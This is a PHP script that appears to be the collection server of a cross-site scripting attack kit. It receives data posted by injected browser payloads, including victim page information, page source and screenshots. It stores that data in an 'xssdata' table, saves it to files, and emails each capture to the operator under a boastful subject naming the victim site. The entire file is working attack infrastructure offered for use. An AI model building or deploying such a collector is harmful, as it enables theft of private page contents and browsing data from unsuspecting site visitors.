<?php
	use PHPMailer\PHPMailer\PHPMailer;
	use PHPMailer\PHPMailer\Exception;
	require 'vendor/autoload.php';

	include 'conn.php';
	$data = file_get_contents('php://input');
	$mysqli = new mysqli();
	$mysqli->connect($host,$dbuser,$dbpass,$dbname);
	$data = json_decode($data);
//	echo $data;
	$sql = "insert into xssdata(information) values ('".mysqli_real_escape_string($mysqli,json_encode($data->information))."')";
	if($mysqli->query($sql)){
		echo 'xixixi';
	}
	else{
		echo 'wuwuwu';
		die();
	}
	$sql = "select * from xssdata order by id desc limit 0,1";
	$rs = $mysqli->query($sql);
	$image = explode(',',$data->screen)[1];
	while($row = $rs->fetch_assoc()){
		file_put_contents("./xss/".$row['id'].".txt", urldecode($data->sourceCode));
		file_put_contents("./xss/".$row['id'].".png",base64_decode($image));
		$mail = new PHPMailer(true);                              // Passing `true` enables exceptions
		try {
		    //Server settings
		    $mail->SMTPDebug = 0;                                 // Enable verbose debug output
		    $mail->isSMTP();                                      // Set mailer to use SMTP
		    $mail->Host = $mailSever;  // Specify main and backup SMTP servers
		    $mail->SMTPAuth = true;                               // Enable SMTP authentication
		    $mail->Username = $mailUser;                 // SMTP username
		    $mail->Password = $mailPassword;                           // SMTP password
		    $mail->SMTPSecure = 'ssl';                            // Enable TLS encryption, `ssl` also accepted
		    $mail->Port = 465;                                    // TCP port to connect to
		
		    //Recipients
		    $mail->setFrom($mailUser, 'xss coming');
		    $mail->addAddress($mailUser);               // Name is optional
		
		    //Content
		    $mail->isHTML(true);                                  // Set email format to HTML
			$data = json_decode($row['information']);
			$host = parse_url($data->url,PHP_URL_HOST);
		    $mail->Subject = 'NiuBi     '.$host;
		    $mail->Body    = 'NiuBi     '.$row['information'];
		    $mail->AltBody = 'NiuBi';
		
		    $mail->send();
		    echo 'Message has been sent';
		} catch (Exception $e) {
		    echo 'Message could not be sent. Mailer Error: ', $mail->ErrorInfo;
		}		
	}
	$mysqli->close();

